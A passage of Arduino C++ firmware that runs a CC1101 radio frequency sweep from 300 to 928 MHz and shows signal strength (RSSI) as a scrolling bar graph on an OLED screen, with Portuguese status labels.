    sweepStep -= 0.5;
    if (sweepStep < 0.1) sweepStep = 0.1;
    delay(150);
  }
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 FreqSweep");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 26);
  if (sweepRunning) u8g2.print("Status: SCANNING");
  else u8g2.print("Status: PARADO");
  u8g2.setCursor(0, 36);
  u8g2.print("Step: ");
  u8g2.print(sweepStep, 1);
  u8g2.print(" MHz");
  u8g2.setCursor(0, 46);
  u8g2.print("Atual: ");
  u8g2.print(sweepFreq, 1);
  u8g2.print(" MHz");
  if (sweepRunning) {
    int currentRssi = -100;
    byte rssiRaw = ELECHOUSE_cc1101.getRssi();
    if (rssiRaw != 0) {
      currentRssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
    }
    int h = map(constrain(currentRssi, -100, -30), -100, -30, 0, 20);
    for (int i = 0; i < 127; i++) sweepRssiHistory[i] = sweepRssiHistory[i + 1];
    sweepRssiHistory[127] = h;
    for (int x = 0; x < 128; x++) {
      if (sweepRssiHistory[x] > 0) u8g2.drawVLine(x, 64 - sweepRssiHistory[x], sweepRssiHistory[x]);
    }
    sweepFreq += sweepStep;
    if (sweepFreq > 928.0) sweepFreq = 300.0;
    ELECHOUSE_cc1101.setMHZ(sweepFreq);
    u8g2.setCursor(80, 58);
    u8g2.print("R:");
    u8g2.print(currentRssi);
  }
  u8g2.sendBuffer();
  delay(50);
}

